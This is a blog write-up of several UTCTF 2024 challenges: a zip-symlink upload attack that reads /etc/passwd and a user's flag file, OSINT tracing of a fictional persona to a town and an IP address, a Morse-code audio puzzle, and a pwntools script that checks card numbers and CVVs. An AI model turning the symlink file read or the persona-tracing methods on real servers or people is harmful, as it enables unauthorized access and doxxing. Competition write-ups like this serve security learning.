---
title: "CTF - UTCTF 2024"
categories: [ctf]
date: 2024-04-01
comments: true
image: /images/kashmir.png
favicon: /images/favicon.ico
description: CTF - UTCTF 2024
---

# UTCTF 2024

Welcome to another CTF writeup. I did some CTFs early this year but didn't publish writeups, but here we are, back again. This time I played UTCTF 2024 in the space weekend time. We participate as [ISwearGoogledIt](https://ctftime.org/team/109689) including the one and only [RazviOverflow](https://razvioverflow.github.io/). Got my first blood on a worldwide CTF, so happy with that ⚡️. Without further ado, let's dive into the challenges!  

<br>

<p align="center">
  <img src="/images/writeups/UTCTF2024/banner.png" width="85%"/>
</p>

---

Challenge index:

### Web
- [Schrödinger (250 solves)](#schrdinger-250-solves)


### Forensic / OSINT
- [OSINT 1 (202 solves)](#osint-1-202-solves)
- [OSINT 2 (141 solves) \[First blood 🩸\]](#osint-2-141-solves-first-blood-)
- [OSINT 3 (96 solves)](#osint-3-96-solves)
- [Study Music (122 solves)](#study-music-122-solves)


### Misc
- [CVV (91 solves)](#cvv-91-solves)


<small><i><a href="https://github.com/kashmir54/md-toc">Table of contents generated with md-toc</a></i></small>

---

<br>

# Web


## Schrödinger (250 solves)

Hey, my digital cat managed to get into my server and I can't get him out.

The only thing running on the server is a website a colleague of mine made.

Can you find a way to use the website to check if my cat's okay? He'll likely be in the user's home directory.

You'll know he's fine if you find a "flag.txt" file.

By helix (@helix_shift on discord)

[http://betta.utctf.live:5422](http://betta.utctf.live:5422)

-

So we have a file upload, and we are cheered to upload a ZIP, so first thing we are trying are Symlinks. We can zip symbolical links to files, so when unzipped, we will have a symlink to a file on the server. This way, the server will include the file. Let's start by trying to reach the /etc/passwd

```bash
# Create the symlink
kali@kali:~/Desktop/CTFs/UTCTF2024/Web$ ln -s /etc/passwd symlink.pdf                         

kali@kali:~/Desktop/CTFs/UTCTF2024/Web$ zip --symlinks sym.zip symlink.pdf
  adding: symlink.pdf (stored 0%)

```

<p align="center">
  <img src="/images/writeups/UTCTF2024/1_0_web.png" width="60%"/>
</p>

So we include the file and we can see the **copenhagen** user. The challenge points for the flag to be un the user home directory, so let's create a symlink to there:

```bash
kali@kali:~/Desktop/CTFs/UTCTF2024/Web$ ln -s /home/copenhagen/flag.txt symlink.pdf

kali@kali:~/Desktop/CTFs/UTCTF2024/Web$ zip --symlinks sym.zip symlink.pdf         
updating: symlink.pdf (stored 0%)
```

Upload the file and we get the flag:

<p align="center">
  <img src="/images/writeups/UTCTF2024/1_1_flag.png" width="50%"/>
</p>


``` utflag{No_Observable_Cats_Were_Harmed} ```

<br>

---

<br>


# Forensic / OSINT

## OSINT 1 (202 solves)

It seems like companies have document leaks all the time nowadays. I wonder if this company has any.

By mzone (@mzone on discord)

[http://puffer.utctf.live:8756](http://puffer.utctf.live:8756)

-

In the challenge we get a website to start. Looking around, we find no valuable info in the web, so we picked up the names of people working in the company from the _team_ section:

<p align="center">
  <img src="/images/writeups/UTCTF2024/3_0_web.png" width="85%"/>
</p>

The first one to appear in the radar was **Cole Minerton** on [Twitter](https://twitter.com/coleminerton):

<p align="center">
  <img src="/images/writeups/UTCTF2024/3_0_twitter.png" width="55%"/>
</p>

In the bio we have a linktree to her social:

<p align="center">
  <img src="/images/writeups/UTCTF2024/3_0_link.png" width="60%"/>
</p>

For this challenge, the focus was on [Youtube](https://www.youtube.com/@ColeMinerton), there, we can find a Discord ([https://discord.gg/re9ez8ey](https://discord.gg/re9ez8ey)) server invite in the channel description:

<p align="center">
  <img src="/images/writeups/UTCTF2024/3_2_youtube.png" width="70%"/>
</p>

In the discord, we have a channel where she talks to her job teammates. Going up in the conversation we find a PDF (trustly_contract.pdf), the flag lies within the text:

<p align="center">
  <img src="/images/writeups/UTCTF2024/3_1_discord.png" width="85%"/>
</p>

<p align="center">
  <img src="/images/writeups/UTCTF2024/3_1_flag.png" width="75%"/>
</p>

``` utflag{discord_is_my_favorite_document_leaking_service} ```

<br>

## OSINT 2 (141 solves) \[First blood 🩸\]
Can you find where the person you identified in the first challenge lives? Flag format is City,State,Zip. For example, if they live at UT Austin submit Austin,TX,78712

-

In her [Mastodon profile](https://mastodon.social/@coleminerton/112021922785919468), we find the following [image](https://files.mastodon.social/media_attachments/files/112/021/921/842/733/815/original/fc8c74d890cd6db9.jpg
) with text: "Filling up the tank before I hit the road ⛽":

<p align="center">
  <img src="/images/writeups/UTCTF2024/3_2_masto.png" width="65%"/>
</p>

Zooming into the photo, we can see "Cimarron Ave", the upper sign is something starting with "2" and "New Mexico Lottery". We are ready to open maps and take a look.

<p align="center">
  <img src="/images/writeups/UTCTF2024/3_2_cimarron.png" width="85%"/>
</p>

There were 3 Cimarron Aves in New Mexico, but one had a cross with "2nd Street", so it was the main option.

<p align="center">
  <img src="/images/writeups/UTCTF2024/3_2_maps.png" width="60%"/>
</p>

So here it is, our gas station with the parking lot in the back. [Link to Google Maps](https://www.google.com/maps/@36.8950397,-104.4409614,3a,58y,134.18h,84.51t/data=!3m6!1e1!3m4!1sA9IingjjWpBya8eew8ea5g!2e0!7i13312!8i6656?entry=ttu):

<p align="center">
  <img src="/images/writeups/UTCTF2024/3_2_gas_park.png" width="85%"/>
</p>


``` Raton,NM,97740 ```

<br>


## OSINT 3 (96 solves)

Can you find their IP address?

Can you find the person's IP address?

-

Checking on the reddit, we could see that coleminerton is a moderator from the [tinyislandsurvival](https://www.reddit.com/r/tinyislandsurvival), this links to the YouTube comment in their video. 

<p align="center">
  <img src="/images/writeups/UTCTF2024/3_3_reddit.png" width="45%"/>
</p>

<p align="center">
  <img src="/images/writeups/UTCTF2024/3_2_youtube_comment.png" width="85%"/>
</p>


So main focus will be on finding a wiki or something. At first glance we found nothing, Google won't help, no mention on the Discord... So a recap of all the Cole's social might help:

- https://twitter.com/coleminerton
- https://www.youtube.com/@ColeMinerton
- https://old.reddit.com/user/coleminerton
- https://www.reddit.com/user/coleminerton (Available in current reddit)
- https://linktr.ee/coleminerton
- https://mastodon.social/@coleminerton
- https://discord.gg/re9ez8ey (From Youtube description)


Going over all the links again, we find that the description of the old and www reddit is different. In the new one we have a discord server, in the old one there is the Wiki we are looking for (fun enough I looked for "tiny island survival" on fandom.com but nothing showed up).

[https://old.reddit.com/r/tinyislandsurvival/](https://old.reddit.com/r/tinyislandsurvival/)

<p align="center">
  <img src="/images/writeups/UTCTF2024/3_3_old_reddit.png" width="35%"/>
</p>

On the change log we can see [Coleminerton](https://tiny-island-survival.fandom.com/wiki/User:Coleminerton) making changes to the Wiki:

<p align="center">
  <img src="/images/writeups/UTCTF2024/3_3_fandom.png" width="85%"/>
</p>


Checking the changelog, we can see a "commit message" that says "oops somehow wasn't logged in for my last edit?". Aparently, Fandom.com will use your public IP address as username when someone does a change unauthenticated, so here we have Cole Minerton's public IP address.

<p align="center">
  <img src="/images/writeups/UTCTF2024/3_3_fandom_com.png" width="85%"/>
</p>

<p align="center">
  <img src="/images/writeups/UTCTF2024/3_3_flag.png" width="85%"/>
</p>

During the enumeration, we also discovered other IP addresses, checking their location, Denver Colorado was the valid IP.

- 202.163.68.138 - PK
- 104.28.217.53 - VN
- [128.62.44.28 - University of Austin, TX](https://tiny-island-survival.fandom.com/wiki/Main_Island?action=history)
- [**181.41.206.31** - Denver Colorado](https://tiny-island-survival.fandom.com/wiki/Tiny_Island_Survival_Wiki?diff=prev&oldid=160)
- ip: 123.234.234.521 - Not an IP (In a commit)


``` 181.41.206.31 ```

## Study Music (122 solves)

I listen to this while studying for my exams. https://youtu.be/1Cbaa6dO2Yk By Danny (Danny on Discord).

Note: the audio is the focus of this challenge. The video can be safely ignored.

-

Sadly enough I got the challenge couple minutes after the CTF ended, but here is what I did. First, find a tool to download the 10 hours video from Youtube (hardest part xd) then take it into Audacity, so we could see a section of the video which had stronger sound waves. In those, there was morse code. We had to take it apart to use some kind of online tool such as [morsecode.world](https://morsecode.world/international/decoder/audio-decoder-adaptive.html). I used several filters, I used EQ filter to leave only the 450-470 Hz where the Morse code lies in this audio. Since the online tool was a pain in the neck due to the noise and my null Audacity skills, I decided to get it by ear and checking with the image:
<div align="center">
	<audio controls>
	  <source src="/images/writeups/UTCTF2024/morse.mp3" type="audio/mpeg">
	  Your browser does not support the audio element.
	</audio>
</div>

<p align="center">
  <img src="/images/writeups/UTCTF2024/4_0_auda.png" width="85%"/>
</p>

```
..- - ..-. .-.. .- --. .-.. ----- ...- ...-- - .... ....- - -.. .- -. -.-. ...-- 
```

Translate from morse to characters and get the flag:

``` UTFLAGL0V3TH4TDANC3 ```

<br>

---

<br>

# Misc

## CVV (91 solves)

I've got some credit cards but I don't which ones are valid. Where did I get them? Uh, that's not important.

Oh, you'll probably need this: dae55498c432545826fb153885bcb06b

By mzone (@mzone on discord)

nc puffer.utctf.live 8625

-

This chall was 90% done by [RazviOverflow](https://razvioverflow.github.io/), so cheers to him.

Basically, we connect with netcat to a port that asks us to validate credit card numbers, providing the PAN, date, CSC and CVV. Furthermore, the chall provides us the CVK, a code that is used by the card issuer. We looked over the internet for different algorithms and the rules for each part, but 3-4 tries to different methods didn't work, so I skipped the chall.

<p align="center">
  <img src="/images/writeups/UTCTF2024/0_0_start.png" width="75%"/>
</p>

Razvi found a [website](https://fint-1227.appspot.com/cvvcalc/) that apparently was generating CVVs matching some of the provided ones by the server, so I modified his pwntools script to use that in order to retrieve the CVV and match with the provided one. We also stored the answers, since we though that the flag would be provided in binary or at the end:


```python
from pwn import *
import re
import json
import requests

responses = []

def is_luhn_valid(cardNb):

	cardNb = str(cardNb[0])
	nDigits = len(cardNb)
	sum = 0
	isSecond = False
	i = nDigits - 1

	while i>=0:

		digit = int(cardNb[i])

		if isSecond:
			digit*=2

		sum +=digit//10
		sum +=digit%10
		isSecond = not isSecond
		i-=1

	return (sum % 10 == 0)


def get_cvv(pan, exp, svc):

	payload = f"cvk=dae55498c432545826fb153885bcb06b&pan={pan[0]}&exp={exp[0]}&svc={svc[0]}"

	print(payload)
	r = requests.post("https://fint-1227.appspot.com/cvvcalc/calculate", data=payload)

	print("Calculated CVV is ", int(r.text))
	return int(r.text)


def is_data_valid(PAN, date, code, cvv):

	print(f"Is PAN {PAN} valid? {is_luhn_valid(PAN)}")
	print(f"Is date {date} valid? {is_date_valid(date)}")
	print(f"Is csc {code} valid? {is_csc_valid(code)}")
	print(f"Is cvv {cvv} valid? {is_csc_valid(cvv)}")

	if is_luhn_valid(PAN):
		if get_cvv(PAN, date, code) == int(cvv[0]):
			return True
		else:
			return False

	return False


def parse_and_answer(p):

	data = p.recvuntil(b"Valid?")
	print(data)

	data = data.decode('utf-8').split("PAN")
	data = data[1].split(",")

	regx_pattern = r'\d+\.\d+|\d+'
	PAN = re.findall(regx_pattern, data[0])
	date = re.findall(regx_pattern, data[1])
	code = re.findall(regx_pattern, data[2])
	cvv = re.findall(regx_pattern, data[3])

	print(f"PAN: {PAN}; date: {date}; code: {code}, CVV: {cvv}")

	if is_data_valid(PAN, date, code, cvv):
		answer = b"1"
		responses.append("1")
	else:
		answer = b"0"
		responses.append("0")
	print(''.join(responses))

	print(answer)
	p.sendline(answer)

if __name__ == "__main__":

	context.log_level = "debug"
	p = remote("puffer.utctf.live", 8625)

	data = p.recvuntil(b"Valid?")
	print(data)

	data = data.decode('utf-8').split("PAN")
	data = data[2].split(",")


	regx_pattern = r'\d+\.\d+|\d+'
	PAN = re.findall(regx_pattern, data[0])
	date = re.findall(regx_pattern, data[1])
	code = re.findall(regx_pattern, data[2])
	cvv = re.findall(regx_pattern, data[3])

	print(f"PAN: {PAN}; date: {date}; code: {code}, CVV: {cvv}")
	
	if is_data_valid(PAN, date, code, cvv):
		answer = b"1"
		responses.append("1")
	else:
		answer = b"0"
		responses.append("0")
	print(''.join(responses))

	print(answer)
	p.sendline(answer)

	while True:
		parse_and_answer(p)

```

Executing the script will retrieve the flag with the answers:

<p align="center">
  <img src="/images/writeups/UTCTF2024/0_0_cvv.png" width="90%"/>
</p>

```
1001110001110101011101000110011001101100011000010110011101111011011
0100001101111011100000110010101011111011011100110111101101110011001
0101011111011011110110011001011111011101000110100001101111011100110
1100101010111110111011101100101011100100110010101011111011110010110
11110111010101110010011100110101111101101100011011110110110001111101
```

After taking the binary into ascii and deleting the innitial gibberish to avoid bruteforcing we got the flag:

``` utflag{hope_none_of_those_were_yours_lol} ```

<br>

So, hope you like the writeup and you find it useful!